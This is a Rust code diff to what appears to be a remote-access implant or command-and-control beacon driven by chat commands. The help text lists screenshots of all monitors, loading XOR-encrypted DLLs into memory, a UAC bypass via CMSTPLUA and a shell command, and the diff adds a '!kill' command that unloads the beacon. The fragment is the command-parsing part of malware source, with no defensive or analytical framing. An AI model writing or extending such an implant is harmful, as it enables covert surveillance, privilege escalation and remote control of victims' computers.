@@ -8,6 +8,7 @@ const HELP_TEXT: &str = "**Available commands:**\n\
     - `!scr` - Take a screenshot of all monitors\n\
     - `!loaddll [name]` - Load attached DLL (XOR encrypted) into memory\n\
     - `!uacbypass [cmd]` - UAC bypass via CMSTPLUA (method 41)\n\
+    - `!kill` - Terminate the beacon (unload DLL)\n\
     - `!help` - Show this help message";
 
 /// Generate help message for unknown commands
@@ -41,6 +42,10 @@ pub enum Command {
     /// Format: "!uacbypass [command]"
     UacBypass(String),
 
+    /// Terminate the beacon by unloading the DLL
+    /// Format: "!kill"
+    Kill,
+
     /// Show help message
     /// Format: "help"
     Help,
@@ -69,6 +74,11 @@ impl Command {
         // Check for "help" command
         if content_lower == "!help" {
             return Command::Help;
+        }
+
+        // Check for "kill" command
+        if content_lower == "!kill" {
+            return Command::Kill;
         }
 
         // Check for "shell " prefix
